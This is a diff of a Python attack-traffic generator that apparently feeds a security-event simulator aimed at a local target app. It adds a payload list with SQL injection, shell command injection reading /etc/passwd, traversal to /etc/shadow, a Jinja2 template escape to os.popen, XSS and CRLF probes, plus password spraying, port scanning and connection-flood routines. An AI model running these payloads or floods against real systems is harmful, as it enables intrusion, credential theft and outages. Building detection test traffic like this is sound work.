@@ -1,20 +1,15 @@
 """
-HTTP Attack Engine.
+HTTP and Network Attack Engine.
 
-Sends genuine HTTP requests to the target web application and builds SecurityEvents
-from the response status codes.
+Sends genuine HTTP and TCP requests to the target web application and builds SecurityEvents
+from the response status codes and connection states.
 
-Only 2 outcomes exist across the system:
+Conforms to Group 4 Data Model:
   200 / 201 → status "ok"
-  401 / other → status "invalid"
-
-Target API has no 403 or 429 built-in security guards.
-Authentication brute-force has an exact 1-in-1000 probability of drawing the correct combo.
+  401 / other / connection timeout → status "invalid"
 """
 
 import asyncio
-import base64
-import json
 import random
 import uuid
 import logging
@@ -32,13 +27,12 @@ logger = logging.getLogger("simulator.attack_engine")
 # ── Attacker identity pools ───────────────────────────────────────────────────
 ATTACKER_IPS = [
     "185.220.101.5", "194.26.29.112", "45.154.255.88",
-
     "103.251.167.20", "91.240.118.172", "198.51.100.42",
 ]
 SPRAY_IPS = ["194.26.29.112", "91.240.118.172", "103.251.167.20"]
 CORP_SUBNETS = ["10.10.1.", "10.10.2.", "172.16.5.", "172.16.8."]
 
-# ── Usernames the attacker attempts ──────────────────────────────────────────
+# ── Usernames for credential and spray attacks ───────────────────────────────
 ALL_USERNAMES = [
     "admin", "root", "administrator", "sysadmin",
     "deploy", "alice", "bob", "guest", "user", "test",
@@ -55,6 +49,12 @@ CORRECT_CREDENTIALS = {
     "alice":         "alice2026",
     "bob":           "bob_secure",
 }
+
+# ── Common passwords used in horizontal password spray ────────────────────────
+COMMON_SPRAY_PASSWORDS = [
+    "Admin@1234", "deploy123", "alice2026", "bob_secure",
+    "P@ssw0rd!", "Welcome2026!", "Company@123", "Spring2026!", "password123"
+]
 
 # ── Large Brute Force Dataset (1,200+ distinct realistic passwords) ───────────
 _BASE_WORDS = [
@@ -75,7 +75,6 @@ for _w in _BASE_WORDS:
         WORDLIST.append(f"{_w}{_s}")
         WORDLIST.append(f"{_w.capitalize()}{_s}")
 
-# Ensure unique and populated
 WORDLIST = list(set(WORDLIST))
 
 # ── Valid credentials for normal baseline traffic ─────────────────────────────
@@ -84,27 +83,124 @@ VALID_CREDENTIALS = {
     "bob":   "bob_secure",
 }
 
-# ── Injection payloads ────────────────────────────────────────────────────────
+# ── Rich Injection Payloads Variety ───────────────────────────────────────────
 INJECTION_PAYLOADS: List[Tuple[str, str, str]] = [
+    # SQL Injection (Tautology, Union, Error-based, Time-based)
     (
         "/api/search?q=' OR '1'='1' --",
-        "sqli",
-        "SQL Injection probe",
+        "sqli_tautology",
+        "SQL Injection boolean tautology probe",
     ),
+    (
+        "/api/search?q=' UNION SELECT username, password FROM users --",
+        "sqli_union",
+        "SQL Injection union-based data extraction probe",
+    ),
+    (
+        "/api/search?q=' AND 1=CONVERT(int, (SELECT @@version)) --",
+        "sqli_error_based",
+        "SQL Injection error-based database version probe",
+    ),
+    (
+        "/api/search?q=1; WAITFOR DELAY '0:0:5' --",
+        "sqli_blind_time",
+        "SQL Injection time-based blind delay probe",
+    ),
+    # OS Command Injection / RCE
+    (
+        "/api/search?q=id; cat /etc/passwd",
+        "rce_unix_cat",
+        "Remote command execution Unix credential probe",
+    ),
+    (
+        "/api/search?q=| whoami",
+        "rce_pipe_whoami",
+        "Remote command execution privilege probe",
+    ),
+    (
+        "/api/search?q=; powershell -c Get-Process",
+        "rce_powershell",
+        "Remote command execution PowerShell probe",
+    ),
+    (
+        "/api/search?q=& ping -n 3 127.0.0.1 &",
+        "rce_ping_oob",
+        "Remote command execution out-of-band probe",
+    ),
+    # Directory Traversal / LFI
     (
         "/api/search?q=../../../../etc/passwd",
-        "path_traversal",
-        "Directory traversal attempt",
+        "path_traversal_linux",
+        "Directory traversal /etc/passwd probe",
     ),
+    (
+        "/api/search?q=../../../../etc/shadow",
+        "path_traversal_shadow",
+        "Directory traversal /etc/shadow probe",
+    ),
+    (
+        "/api/search?q=..\\..\\..\\windows\\win.ini",
+        "path_traversal_win",
+        "Directory traversal Windows win.ini probe",
+    ),
+    (
+        "/api/search?q=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts",
+        "path_traversal_urlencode",
+        "URL-encoded traversal evasion probe",
+    ),
+    # NoSQL Injection
     (
         "/api/search?q=admin[$ne]=x",
-        "nosql_injection",
-        "NoSQL operator injection probe",
+        "nosql_ne_operator",
+        "NoSQL not-equal operator injection probe",
     ),
     (
-        "/api/search?q=id;cat%20/etc/shadow",
-        "rce_probe",
-        "Remote command execution probe",
+        "/api/search?q=user[$gt]=\"\"",
+        "nosql_gt_operator",
+        "NoSQL greater-than operator injection probe",
+    ),
+    (
+        "/api/search?q={\"$where\": \"this.password.length > 0\"}",
+        "nosql_where_eval",
+        "NoSQL Javascript where clause evaluation probe",
+    ),
+    # Server-Side Template Injection (SSTI)
+    (
+        "/api/search?q={{7*7}}",
+        "ssti_jinja_eval",
+        "Server-side template expression evaluation probe",
+    ),
+    (
+        "/api/search?q=${7*7}",
+        "ssti_spring_el",
+        "Spring Expression Language template probe",
+    ),
+    (
+        "/api/search?q={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+        "ssti_rce_payload",
+        "Jinja2 template escape to OS execution",
+    ),
+    # Cross-Site Scripting (XSS Probes)
+    (
+        "/api/search?q=<script>alert('XSS')</script>",
+        "xss_script_tag",
+        "Reflected cross-site scripting script injection probe",
+    ),
+    (
+        "/api/search?q=\"><img src=x onerror=alert(1)>",
+        "xss_img_onerror",
+        "Reflected cross-site scripting attribute breakout",
+    ),
+    # LDAP & Header / CRLF Injection
+    (
+        "/api/search?q=*)(uid=*))(|(uid=*",
+        "ldap_filter_bypass",
+        "LDAP filter manipulation probe",
+    ),
+    (
+        "/api/search?q=%0d%0aSet-Cookie:malicious=true",
+        "crlf_header_injection",
+        "HTTP response splitting and header injection probe",
     ),
 ]
 
@@ -113,46 +209,6 @@ BENIGN_QUERIES = [
     "monthly+report", "user+list", "inventory",
     "orders+2026", "dashboard+stats", "product+catalog",
 ]
-
-# ── BOLA Object targets ───────────────────────────────────────────────────────
-BOLA_DOCUMENTS = ["1001", "1002", "1003", "1004", "1005", "2048", "3099", "4096", "5120"]
-
-# ── JWT Tampering Templates ───────────────────────────────────────────────────
-JWT_TAMPER_SCENARIOS = [
-    {
-        "technique": "alg_none_bypass",
-        "header": {"alg": "none", "typ": "JWT"},
-        "claims": {"sub": "admin", "role": "superuser", "is_admin": True},
-        "has_signature": False,
-    },
-    {
-        "technique": "privilege_claim_tampering",
-        "header": {"alg": "HS256", "typ": "JWT"},
-        "claims": {"sub": "alice", "role": "root", "permissions": ["users:write", "system:manage"]},
-        "has_signature": True,
-    },
-    {
-        "technique": "expired_token_reuse",
-        "header": {"alg": "HS256", "typ": "JWT"},
-        "claims": {"sub": "sysadmin", "exp": 1577836800, "role": "admin"},
-        "has_signature": True,
-    },
-    {
-        "technique": "tenant_id_manipulation",
-        "header": {"alg": "HS256", "typ": "JWT"},
-        "claims": {"sub": "guest", "tenant_id": "corporate_master", "is_superuser": True},
-        "has_signature": True,
-    },
-]
-
-
-def _build_tampered_jwt(scenario: dict) -> str:
-    h_b64 = base64.urlsafe_b64encode(json.dumps(scenario["header"]).encode()).decode().rstrip("=")
-    c_b64 = base64.urlsafe_b64encode(json.dumps(scenario["claims"]).encode()).decode().rstrip("=")
-    if not scenario["has_signature"]:
-        return f"{h_b64}.{c_b64}."
-    sig_b64 = base64.urlsafe_b64encode(b"invalid_forged_signature_hash").decode().rstrip("=")
-    return f"{h_b64}.{c_b64}.{sig_b64}"
 
 
 def _ts() -> str:
@@ -204,48 +260,9 @@ def _build_auth_event(
         raw_payload={
             "attack_type": attack_type,
             "http_status": resp.status_code,
-            "auth_method": "password",
-            "password_tried": password_tried[:3] + "***",
+            "auth_method": "password_http",
+            "password_tried": password_tried[:3] + "***" if len(password_tried) >= 3 else "***",
             "failure_reason": None if status == "ok" else "invalid_credentials",
-            "threat_flag": "malicious" if is_attack else "benign",
-            "severity": (
-                "CRITICAL" if (is_attack and status == "ok")
-                else "HIGH" if is_attack
-                else None
-            ),
-        },
-    )
-
-
-def _build_jwt_event(
-    resp: httpx.Response,
-    src_ip: str,
-    base_url: str,
-    username: str,
-    technique: str,
-    header: dict,
-    claims: dict,
-    is_attack: bool,
-) -> SecurityEvent:
-    status = _status_from_http(resp.status_code)
-    ts = _ts()
-    return SecurityEvent(
-        event_id=str(uuid.uuid4()),
-        event_time=ts,
-        ingest_time=ts,
-        source_type="auth",
-        src_ip=src_ip,
-        dest_ip_port=_dest_from_url(base_url),
-        user=username,
-        status=status,
-        raw_payload={
-            "attack_type": "jwt_token_tampering",
-            "http_status": resp.status_code,
-            "auth_method": "jwt_bearer",
-            "technique": technique,
-            "jwt_header": header,
-            "jwt_claims": claims,
-            "failure_reason": None if status == "ok" else "invalid_token_signature",
             "threat_flag": "malicious" if is_attack else "benign",
             "severity": (
                 "CRITICAL" if (is_attack and status == "ok")
@@ -297,8 +314,11 @@ def _build_api_event(
     )
 
 
-# ── Network Probing Ports ─────────────────────────────────────────────────────
-SCAN_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 1433, 3306, 3389, 5432, 6379, 8080, 8443, 9200, 27017]
+# ── Network Probing Ports (includes victim port 8002) ─────────────────────────
+SCAN_PORTS = [
+    21, 22, 23, 25, 53, 80, 110, 143, 443, 445,
+    1433, 3306, 3389, 5432, 6379, 8002, 8080, 8443, 9200, 27017
+]
 
 
 def _build_network_event(
@@ -334,11 +354,9 @@ def _build_network_event(
 
 
 class ScenarioEngine:
-
     """
-    HTTP Attack Engine.
-
-    Manages persistent async HTTP client against the target web application.
+    HTTP and Network Attack Engine.
+    Manages persistent async HTTP and TCP probes against the target web application.
     """
 
     def __init__(self):
@@ -368,8 +386,7 @@ class ScenarioEngine:
             )
         return self._client
 
-
-    # ── Auth attacks ──────────────────────────────────────────────────────────
+    # ── Auth Attacks (2 scenarios) ────────────────────────────────────────────
 
     async def generate_auth_brute_force(
         self,
@@ -378,13 +395,13 @@ class ScenarioEngine:
         **_,
     ) -> SecurityEvent:
         """
-        Send POST /login with a password from the large dataset.
-        Exactly 1 in 1000 attempts (0.001 probability) uses the correct password.
+        Credential Brute Force (Vertical attack).
+        Sends POST /login targeting a single account with passwords from the dictionary.
+        Exactly 1 in 1000 attempts uses the correct password.
         """
         client = self._client_or_raise()
         attacker_ip = random.choice(ATTACKER_IPS)
 
-        # Exactly 1 in 1000 chance to hit the correct combo
         if random.random() < 0.001:
             password = CORRECT_CREDENTIALS.get(target_user, "Admin@1234")
         else:
@@ -405,45 +422,43 @@ class ScenarioEngine:
         )
         return _build_auth_event(
             resp, attacker_ip, target_url,
-            target_user, password, "ssh_brute_force", is_attack=True,
+            target_user, password, "credential_brute_force", is_attack=True,
         )
 
-    async def generate_auth_jwt_tampering(
+    async def generate_auth_password_spray(
         self,
         target_url: str = "http://localhost:8002",
-        target_user: str = "admin",
         **_,
     ) -> SecurityEvent:
         """
-        Send GET /api/protected with forged/tampered JWT Authorization header.
-        Target checks signature, returns 401 Unauthorized (status: 'invalid').
+        Horizontal Password Spraying.
+        Cycles 1 or 2 common passwords across multiple usernames from rotating spray IPs.
+        Evades account lockouts; returns 200 OK when hitting accounts matching common passwords.
         """
         client = self._client_or_raise()
-        attacker_ip = random.choice(ATTACKER_IPS)
-        scenario = random.choice(JWT_TAMPER_SCENARIOS)
-        token = _build_tampered_jwt(scenario)
-        username = scenario["claims"].get("sub", target_user)
+        attacker_ip = random.choice(SPRAY_IPS)
+        username = random.choice(ALL_USERNAMES)
+        password = random.choice(COMMON_SPRAY_PASSWORDS)
 
         try:
-            resp = await client.get(
-                f"{target_url}/api/protected",
-                headers={"Authorization": f"Bearer {token}"},
+            resp = await client.post(
+                f"{target_url}/login",
+                json={"username": username, "password": password},
             )
         except Exception as exc:
-            logger.warning(f"jwt HTTP error: {exc}")
+            logger.warning(f"password_spray HTTP error: {exc}")
             resp = httpx.Response(503)
 
         logger.debug(
-            f"JWT_TAMPER  tech={scenario['technique']!r}  user={username!r}  "
+            f"PASSWORD_SPRAY  user={username!r}  pwd={password[:3]}***  "
             f"→ HTTP {resp.status_code}"
         )
-        return _build_jwt_event(
+        return _build_auth_event(
             resp, attacker_ip, target_url,
-            username, scenario["technique"], scenario["header"], scenario["claims"],
-            is_attack=True,
+            username, password, "horizontal_password_spray", is_attack=True,
         )
 
-    # ── API attacks (2 scenarios) ─────────────────────────────────────────────
+    # ── API Attacks (2 scenarios) ─────────────────────────────────────────────
 
     async def generate_api_injection_probe(
         self,
@@ -451,8 +466,9 @@ class ScenarioEngine:
         **_,
     ) -> SecurityEvent:
         """
-        Send GET /api/search with an injection payload in the query string.
-        Target has no prevention rules, so it returns 200 OK (status: 'ok').
+        API Injection Probe across diverse vulnerability classes.
+        Sends GET /api/search with SQLi, command injection, path traversal, NoSQL, SSTI, XSS, etc.
+        Target processes all queries without filtering, always returning 200 OK.
         """
         client = self._client_or_raise()
         attacker_ip = random.choice(ATTACKER_IPS)
@@ -476,33 +492,41 @@ class ScenarioEngine:
     async def generate_api_rate_limit(
         self,
         target_url: str = "http://localhost:8002",
+        concurrency: int = 5,
         **_,
     ) -> SecurityEvent:
         """
-        Send POST /api/export to flood export endpoint.
-        Target has no rate limiter, returns 200 OK (status: 'ok').
+        Rate Limit Exhaustion via concurrent request flooding.
+        Fires a batch of parallel requests simultaneously using asyncio.gather.
+        Target has no rate limiter, returns 200 OK.
         """
         client = self._client_or_raise()
         attacker_ip = "45.154.255.88"
         endpoint = "/api/export"
 
-        try:
-            resp = await client.post(
-                f"{target_url}{endpoint}",
-                json={"format": "csv"},
-            )
-        except Exception as exc:
-            logger.warning(f"rate_limit HTTP error: {exc}")
-            resp = httpx.Response(503)
+        async def _send_single_export():
+            try:
+                return await client.post(
+                    f"{target_url}{endpoint}",
+                    json={"format": "csv"},
+                )
+            except Exception as exc:
+                logger.warning(f"rate_limit concurrent HTTP error: {exc}")
+                return httpx.Response(503)
 
-        logger.debug(f"RATE_LIMIT  → HTTP {resp.status_code}")
+        # Fire concurrent requests in parallel
+        tasks = [_send_single_export() for _ in range(concurrency)]
+        responses = await asyncio.gather(*tasks)
+        primary_resp = responses[0] if responses else httpx.Response(503)
+
+        logger.debug(f"RATE_LIMIT CONCURRENT FLOOD  concurrency={concurrency} → HTTP {primary_resp.status_code}")
         return _build_api_event(
-            resp, attacker_ip, target_url,
+            primary_resp, attacker_ip, target_url,
             endpoint, "POST", "rate_limit_exhaustion",
-            None, None, is_attack=True,
+            None, f"Concurrent request flood ({concurrency} parallel requests)", is_attack=True,
         )
 
-    # ── Network attacks (2 scenarios) ─────────────────────────────────────────
+    # ── Network Attacks (2 scenarios) ─────────────────────────────────────────
 
     async def generate_network_port_scan(
         self,
@@ -510,20 +534,28 @@ class ScenarioEngine:
         **_,
     ) -> SecurityEvent:
         """
-        Simulate TCP SYN port scanning across common administrative/service ports.
-        Attempts connection or socket probe against the target host.
+        TCP Port Scan Sweep.
+        Attempts full TCP 3-way connection handshakes across common administration and service ports
+        (including target victim port 8002) with 0.5s timeout suitable for cloud instances.
         """
         attacker_ip = random.choice(ATTACKER_IPS)
         parsed = urlparse(target_url)
         target_host = parsed.hostname or "127.0.0.1"
-        port = random.choice(SCAN_PORTS)
+        target_app_port = parsed.port or (443 if parsed.scheme == "https" else 80)
+
+        # Ensure active target port is in the pool
+        candidate_ports = list(SCAN_PORTS)
+        if target_app_port not in candidate_ports:
+            candidate_ports.append(target_app_port)
+
+        port = random.choice(candidate_ports)
         dest_str = f"{target_host}:{port}"
 
-        # Real TCP probe with ultra-short timeout to observe port state
+        # Real TCP socket connection attempt
         try:
             _, writer = await asyncio.wait_for(
                 asyncio.open_connection(target_host, port),
-                timeout=0.15
+                timeout=0.5
             )
             writer.close()
             await writer.wait_closed()
@@ -542,58 +574,72 @@ class ScenarioEngine:
             status=status,
             payload_details={
                 "port_probed": port,
-                "tcp_flags": "SYN",
-                "probe_technique": "stealth_syn_scan",
+                "scan_type": "tcp_connect_scan",
+                "handshake": "full_connect_3_way",
                 "port_state": tcp_state,
-                "description": f"Horizontal and vertical port probe on port {port} ({tcp_state})",
+                "description": f"TCP port connection sweep probing port {port} ({tcp_state})",
             },
             is_attack=True,
         )
 
-    async def generate_network_slowloris(
+    async def generate_network_connection_flood(
         self,
         target_url: str = "http://localhost:8002",
+        concurrency: int = 8,
         **_,
     ) -> SecurityEvent:
         """
-        Simulate Slowloris HTTP header starvation attack holding socket connections open.
+        TCP Connection Flood.
+        Opens rapid concurrent TCP socket connections against the target host and port
+        to test socket connection pool limits and backlog capacity.
         """
         attacker_ip = random.choice(ATTACKER_IPS)
-        client = self._client_or_raise()
-        dest_str = _dest_from_url(target_url)
+        parsed = urlparse(target_url)
+        target_host = parsed.hostname or "127.0.0.1"
+        target_port = parsed.port or (443 if parsed.scheme == "https" else 80)
+        dest_str = f"{target_host}:{target_port}"
 
-        try:
-            await client.get(
-                f"{target_url}/api/search?q=slowloris_probe",
-                headers={
-                    "X-Slow-Header-A": "keep-alive-drip",
-                    "X-Slow-Header-B": "chunked-starvation-test",
-                },
-                timeout=1.0,
-            )
-            status: EventStatus = "ok"
-        except Exception as exc:
-            logger.warning(f"slowloris HTTP error: {exc}")
-            status = "invalid"
+        successful_conns = 0
+        failed_conns = 0
 
-        logger.debug(f"SLOWLORIS  dest={dest_str}  → status={status}")
+        async def _probe_socket():
+            nonlocal successful_conns, failed_conns
+            try:
+                _, writer = await asyncio.wait_for(
+                    asyncio.open_connection(target_host, target_port),
+                    timeout=0.5
+                )
+                successful_conns += 1
+                await asyncio.sleep(0.01)
+                writer.close()
+                await writer.wait_closed()
+            except Exception:
+                failed_conns += 1
+
+        # Fire concurrent socket attempts
+        tasks = [_probe_socket() for _ in range(concurrency)]
+        await asyncio.gather(*tasks)
+
+        status: EventStatus = "ok" if successful_conns > 0 else "invalid"
+        logger.debug(f"TCP_CONN_FLOOD dest={dest_str} success={successful_conns}/{concurrency}")
+
         return _build_network_event(
             src_ip=attacker_ip,
             dest_ip_port=dest_str,
-            attack_type="slowloris_attack",
+            attack_type="tcp_connection_flood",
             protocol="tcp",
             status=status,
             payload_details={
-                "method": "GET",
-                "attack_vector": "slow_headers",
-                "simulated_connections": random.randint(20, 100),
-                "keep_alive_interval_sec": 15,
-                "description": "Slowloris header starvation holding HTTP socket descriptors open",
+                "attack_vector": "socket_backlog_flood",
+                "concurrency": concurrency,
+                "successful_handshakes": successful_conns,
+                "dropped_connections": failed_conns,
+                "description": f"Concurrent TCP socket connection flood ({concurrency} sockets) targeting {dest_str}",
             },
             is_attack=True,
         )
 
-    # ── Normal benign traffic ─────────────────────────────────────────────────
+    # ── Normal Benign Baseline Traffic ────────────────────────────────────────
 
     async def generate_normal_auth(
         self,
@@ -663,34 +709,55 @@ class ScenarioEngine:
             is_attack=False,
         )
 
-    # ── Dispatcher ────────────────────────────────────────────────────────────
+    # ── Dispatchers ───────────────────────────────────────────────────────────
 
     async def generate_random_event(
         self,
         target_url: str = "http://localhost:8002",
         target_user: str = "admin",
-        only_attacks: bool = False,
+        only_attacks: bool = True,
         selected_scenarios: Optional[List[str]] = None,
-        attack_ratio: float = 0.3,
+        attack_ratio: float = 1.0,
         **_,
     ) -> SecurityEvent:
+        active_pool = selected_scenarios if selected_scenarios is not None else [
+            "auth_brute_force", "auth_password_spray",
+            "api_injection_probe", "api_rate_limit",
+            "network_port_scan", "network_connection_flood",
+        ]
+
+        # If user explicitly cleared all scenarios, return safe benign event
+        if not active_pool:
+            return await self.generate_normal_auth(target_url=target_url)
+
         is_attack = only_attacks or (random.random() < attack_ratio)
 
         if is_attack:
-            pool = selected_scenarios or [
-                "auth_brute_force", "auth_jwt_tampering",
-                "api_injection_probe", "api_rate_limit",
-                "network_port_scan", "network_slowloris",
-            ]
-            scenario = random.choice(pool)
+            scenario = random.choice(active_pool)
             return await self.trigger_named_attack(
                 scenario, target_url=target_url, target_user=target_user
             )
         else:
-            r = random.random()
-            if r < 0.4:
+            # Baseline traffic strictly matches the categories selected by the user
+            has_auth = any(s.startswith("auth_") for s in active_pool)
+            has_api = any(s.startswith("api_") for s in active_pool)
+            has_net = any(s.startswith("network_") for s in active_pool)
+
+            category_options = []
+            if has_auth:
+                category_options.append("auth")
+            if has_api:
+                category_options.append("api")
+            if has_net:
+                category_options.append("network")
+
+            if not category_options:
+                category_options = ["auth"]
+
+            chosen_cat = random.choice(category_options)
+            if chosen_cat == "auth":
                 return await self.generate_normal_auth(target_url=target_url)
-            elif r < 0.8:
+            elif chosen_cat == "api":
                 return await self.generate_normal_api(target_url=target_url)
             else:
                 return await self.generate_normal_network(target_url=target_url)
@@ -704,18 +771,16 @@ class ScenarioEngine:
     ) -> SecurityEvent:
         if scenario_name == "auth_brute_force":
             return await self.generate_auth_brute_force(target_url, target_user)
-        elif scenario_name == "auth_jwt_tampering":
-            return await self.generate_auth_jwt_tampering(target_url, target_user)
+        elif scenario_name == "auth_password_spray":
+            return await self.generate_auth_password_spray(target_url)
         elif scenario_name in ("api_injection_probe", "api_sql_injection"):
             return await self.generate_api_injection_probe(target_url)
         elif scenario_name == "api_rate_limit":
             return await self.generate_api_rate_limit(target_url)
         elif scenario_name == "network_port_scan":
             return await self.generate_network_port_scan(target_url)
-        elif scenario_name == "network_slowloris":
-            return await self.generate_network_slowloris(target_url)
+        elif scenario_name == "network_connection_flood":
+            return await self.generate_network_connection_flood(target_url)
         else:
             logger.warning(f"Unknown scenario '{scenario_name}', defaulting to brute_force.")
             return await self.generate_auth_brute_force(target_url, target_user)
-
-
